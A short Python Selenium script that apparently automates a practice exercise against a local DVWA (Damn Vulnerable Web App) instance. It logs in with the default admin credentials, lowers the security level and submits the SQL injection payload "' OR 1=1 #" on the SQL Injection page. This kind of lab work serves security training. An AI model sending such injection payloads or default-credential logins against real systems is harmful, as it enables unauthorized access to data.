#!/usr/bin/python

# http://stackoverflow.com/questions/8871654/how-to-press-click-the-button-using-selenium-if-the-button-does-not-have-the-id
# http://stackoverflow.com/questions/12090084/selecting-a-link-with-selenium-webdriver
# http://selenium-python.readthedocs.org
#

from selenium import webdriver
from selenium.webdriver.common.keys import Keys

driver = webdriver.Firefox()
driver.get("http://localhost/dvwa")
assert "Damn Vulnerable Web App (DVWA) - Login" in driver.title
login = driver.find_element_by_name("username")
login.send_keys("admin")
login = driver.find_element_by_name("password")
login.send_keys("password")
login.send_keys(Keys.RETURN)

assert "Damn Vulnerable Web App (DVWA) v1.8 :: Welcome" in driver.title
continue_link = driver.find_element_by_link_text("DVWA Security").click()
security = driver.find_element_by_name("security")
security.send_keys("low")
security = driver.find_element_by_name("seclev_submit").click()

continue_link = driver.find_element_by_link_text("SQL Injection").click()

sql = driver.find_element_by_name("id")
sql.send_keys("' OR 1=1 #")
sql = driver.find_element_by_name("Submit").click()

driver.close()
